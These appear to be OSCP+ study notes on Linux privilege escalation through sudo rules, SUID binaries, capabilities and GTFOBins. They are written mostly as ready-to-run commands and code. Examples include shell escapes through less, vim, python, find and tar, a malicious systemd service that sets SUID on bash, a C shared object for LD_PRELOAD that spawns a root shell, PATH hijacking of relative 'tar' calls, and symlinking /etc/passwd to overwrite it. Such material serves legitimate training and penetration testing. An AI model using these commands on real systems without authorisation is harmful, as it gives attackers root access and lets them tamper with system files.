# 1️⃣ Sudo

We’ll break this into:

1. Enumeration methodology
    
2. Dangerous sudo patterns
    
3. Advanced exploitation vectors
    
4. Real OSCP-style chains
    
5. Modern mitigations & bypass strategies
    

---

# 1️⃣ Enumeration (Properly)

Always start with:

```bash
sudo -l
```

But OSCP+ requires deeper awareness.

Look for:

### 🔍 A. User context

```
User bob may run the following commands on host:
```

Are you running as:

- (root)
    
- (ALL)
    
- (www-data)
    
- Another low-priv user?
    

Running as another user may allow **horizontal escalation first**.

---

### 🔍 B. NOPASSWD

```
(ALL) NOPASSWD: /usr/bin/awk
```

Immediate exploit path.

But even WITH password is exploitable if:

- You already know the password
    
- Or password reuse exists
    

---

### 🔍 C. Wildcards

```
(ALL) NOPASSWD: /usr/bin/less /var/log/*
```

Wildcards are dangerous.

You may:

- Control files in that directory
    
- Abuse path traversal
    
- Use symlinks
    

---

### 🔍 D. Environment Preservation

Look for:

```
env_keep
```

Or:

```
SETENV
```

This enables:

- LD_PRELOAD injection
    
- PATH hijacking
    
- Library hijacking
    

Huge in OSCP+.

---

# 2️⃣ High-Value Sudo Targets

These are exam-relevant.

---

## 🟢 Editors (Vim, Nano, Less, More)

If you see:

```
(ALL) NOPASSWD: /usr/bin/less
```

Inside less:

```
!bash
```

Or:

```
v
:!bash
```

---

## 🟢 Interpreters

Python, Perl, Ruby, Awk.

Example:

```
(ALL) NOPASSWD: /usr/bin/python3
```

Exploit:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

---

## 🟢 find

```
sudo find . -exec /bin/bash \; -quit
```

---

## 🟢 tar (OSCP classic)

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

---

## 🟢 Systemctl (VERY COMMON OSCP+)

If allowed:

```
(ALL) NOPASSWD: /bin/systemctl
```

Exploit by creating malicious service.

### Step 1: Create service file

```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"' > evil.service
```

### Step 2:

```bash
sudo systemctl link ./evil.service
sudo systemctl start evil.service
```

Then:

```bash
/bin/bash -p
```

Root shell.

---

# 3️⃣ Advanced OSCP+ Vectors

Now we move beyond GTFOBins copy/paste.

---

# 🔥 A. LD_PRELOAD Abuse (Critical OSCP+ Concept)

If sudo allows environment modification:

```
(ALL) NOPASSWD: /usr/bin/somebinary
```

And `env_reset` is NOT strict.

### Step 1: Write malicious shared object

```c
#include <stdio.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Compile:

```bash
gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
```

Run:

```bash
sudo LD_PRELOAD=./exploit.so somebinary
```

Root shell.

This is **very OSCP+ realistic**.

---

# 🔥 B. PATH Hijacking

If sudo runs a script:

```
(ALL) NOPASSWD: /usr/local/bin/backup.sh
```

Inspect script:

```bash
cat /usr/local/bin/backup.sh
```

If it runs:

```
tar -czf backup.tar.gz /home
```

No full path used.

Exploit:

```bash
echo '/bin/bash' > tar
chmod +x tar
export PATH=.:$PATH
sudo /usr/local/bin/backup.sh
```

Root.

---

# 🔥 C. Sudo + Writable Script

Very common in OSCP+:

```
(ALL) NOPASSWD: /opt/scripts/cleanup.sh
```

Check permissions:

```bash
ls -l /opt/scripts/cleanup.sh
```

If writable:

```bash
echo "chmod +s /bin/bash" >> cleanup.sh
sudo /opt/scripts/cleanup.sh
/bin/bash -p
```

---

# 🔥 D. Sudo + Wildcard Injection

Example:

```
(ALL) NOPASSWD: /bin/chown * /opt/app/*
```

If you can create filenames starting with `--reference=` etc, you may abuse argument injection.

This is advanced and exam-relevant.

---

# 4️⃣ OSCP+ Realistic Attack Chain Example

Imagine:

- You gain www-data
    
- Escalate to user1 via credentials
    
- user1 has:
    

```
(user2) NOPASSWD: /usr/bin/python3 /home/user2/script.py
```

You:

- Modify script.py if writable
    
- Or abuse python execution context
    
- Escalate to user2
    
- user2 has sudo root entry
    

This layered escalation is common in OSCP+.

---

# 5️⃣ Modern Protections & How to Think

### If you see:

```
secure_path=/usr/sbin:/usr/bin:/sbin:/bin
```

PATH hijacking likely mitigated.

### If you see:

```
env_reset
```

LD_PRELOAD might fail.

### If binary is static:

LD_PRELOAD won’t work.

---

# 🔥 OSCP+ Sudo Escalation Checklist

Every time:

```bash
sudo -l
```

Then ask:

1. Can I spawn a shell directly?
    
2. Is the binary an interpreter?
    
3. Does it call external programs?
    
4. Does it use relative paths?
    
5. Is environment preserved?
    
6. Can I write to the executed file?
    
7. Can I abuse arguments?
    
8. Can I escalate laterally first?
    

---

# 2️⃣ SUID (Set User ID)

This is where many candidates fail.

We’ll break this into:

1. Deep SUID mechanics
    
2. Proper enumeration
    
3. High-value SUID targets
    
4. Advanced exploitation patterns
    
5. Custom binary exploitation methodology
    
6. OSCP+ realistic scenarios
    
7. Modern mitigations
    

---

# 🔴 1️⃣ What SUID Actually Does (Kernel Level)

When a binary has the SUID bit set:

```bash
-rwsr-xr-x 1 root root 54256 binary
```

It executes with the **effective UID (euid) of the file owner**, not the caller.

So if owned by root:

- Real UID = you
    
- Effective UID = root
    

That difference matters.

Check inside shell:

```bash
id
```

Or in C:

```c
getuid();     // real UID
geteuid();    // effective UID
```

Privilege escalation works when:

- The program does something dangerous
    
- Or trusts user-controlled input
    

---

# 🔎 2️⃣ Proper Enumeration (OSCP+ Level)

Basic:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Better:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Then filter:

```bash
getcap -r / 2>/dev/null
```

Capabilities are SUID’s modern cousin.

---

# 🧠 OSCP+ Filtering Strategy

Ignore standard safe binaries:

- /usr/bin/passwd
    
- /usr/bin/sudo
    
- /bin/mount
    
- /bin/su
    

Focus on:

- Custom binaries in /opt
    
- Scripts in /usr/local
    
- Dev leftovers
    
- Backup utilities
    
- Unknown compiled programs
    

---

# 🟢 3️⃣ Common SUID Exploitable Binaries

These appear in labs:

## find

```bash
./find . -exec /bin/bash -p \; -quit
```

The `-p` preserves privileges.

---

## vim / less / more

```bash
vim -c ':!/bin/bash'
```

---

## cp (file overwrite vector)

Can overwrite `/etc/passwd` in some misconfigs.

---

## nmap (older versions only)

Interactive mode allowed shell escape.

Modern versions patched.

---

# 🔥 4️⃣ Advanced SUID Exploitation

Now we move beyond copy/paste.

---

# 🧨 A. SUID + PATH Hijacking

Imagine SUID binary calls:

```c
system("tar -czf backup.tar.gz /home");
```

It does NOT use full path `/bin/tar`.

You can:

```bash
echo "/bin/bash" > tar
chmod +x tar
export PATH=.:$PATH
./vulnerable_binary
```

If SUID preserves PATH → root shell.

Modern systems often drop privileges before `system()`.  
So test carefully.

---

# 🧨 B. SUID + system() Abuse

If binary uses:

```c
system(user_input);
```

And does not sanitize input → command injection.

Very common in OSCP+ custom binaries.

---

# 🧨 C. SUID + Buffer Overflow (High-Value Skill)

If custom SUID binary crashes:

```bash
./binary $(python3 -c 'print("A"*200)')
```

Segfault?

Now you're in classic local root BOF territory.

Steps:

1. Fuzz
    
2. Control RIP/EIP
    
3. Inject shellcode
    
4. Spawn root shell
    

On Linux:

- ASLR may be enabled
    
- NX likely enabled
    
- You may need ROP
    

OSCP+ may include basic stack BOF in SUID.

---

# 🧨 D. SUID + File Write

If binary:

```c
fopen("/tmp/log.txt", "w");
```

You can symlink:

```bash
ln -s /etc/passwd /tmp/log.txt
./binary
```

Overwrite system file.

Symlink attacks are VERY exam-relevant.

---

# 🧨 E. SUID + LD_LIBRARY_PATH

If binary dynamically loads libraries and:

- Does not sanitize environment
    
- Is not compiled with secure exec
    

You may:

```bash
export LD_LIBRARY_PATH=.
```

And place malicious `.so` file.

Less common but powerful.

---

# 🧨 F. SUID + Capabilities (Modern OSCP+)

Check:

```bash
getcap -r / 2>/dev/null
```

Example:

```bash
/usr/bin/python3 = cap_setuid+ep
```

Exploit:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Capabilities are frequently overlooked.

---

# 🔴 5️⃣ Custom Binary Analysis Workflow (OSCP+ Critical)

When you find:

```
/opt/backup
```

Don’t guess.

Analyze.

---

### Step 1: strings

```bash
strings backup | less
```

Look for:

- system(
    
- /bin/sh
    
- relative paths
    
- file locations
    

---

### Step 2: ltrace

```bash
ltrace ./backup
```

See library calls.

---

### Step 3: strace

```bash
strace ./backup
```

See syscalls:

- execve
    
- open
    
- access
    
- setuid
    

---

### Step 4: Check file permissions it touches

Does it:

- Write to predictable files?
    
- Read from user-controlled location?
    

---

# 🧠 OSCP+ Realistic Scenario

You find:

```bash
/opt/scripts/backup
```

SUID root.

`strings` shows:

```
tar -czf backup.tar.gz /home/user
```

No full path.

Exploit:

```bash
echo "/bin/bash" > tar
chmod +x tar
export PATH=.:$PATH
./backup
```

Root.

---

Another:

Binary writes to:

```
/tmp/log.txt
```

Exploit:

```bash
ln -s /etc/passwd /tmp/log.txt
./backup
```

Overwrite root password.

---

# 🔴 6️⃣ Modern Mitigations You Must Understand

Modern SUID binaries:

- Drop privileges early
    
- Clear environment variables
    
- Use absolute paths
    
- Use execve instead of system
    
- Disable LD_PRELOAD
    

So blind PATH hijacking won’t always work.

You must verify with:

```bash
strace ./binary
```

Watch if it respects your PATH.

---

# 🔥 7️⃣ OSCP+ SUID Escalation Checklist

When you find SUID binary:

1. Is it standard or custom?
    
2. Does it call system()?
    
3. Does it use relative paths?
    
4. Does it write to files?
    
5. Can I symlink attack?
    
6. Does it crash?
    
7. Does it accept user input?
    
8. Does it drop privileges?
    
9. Does it use libraries I can hijack?
    
10. Does it have capabilities instead?
    


---

# 3️⃣ GTFOBins

### What It Is

GTFOBins is a curated list of Unix binaries that can be abused for:

- Privilege escalation
    
- File reads
    
- File writes
    
- Shell spawning
    
- SUID abuse
    
- Sudo abuse
    

Website:  
[https://gtfobins.github.io/](https://gtfobins.github.io/)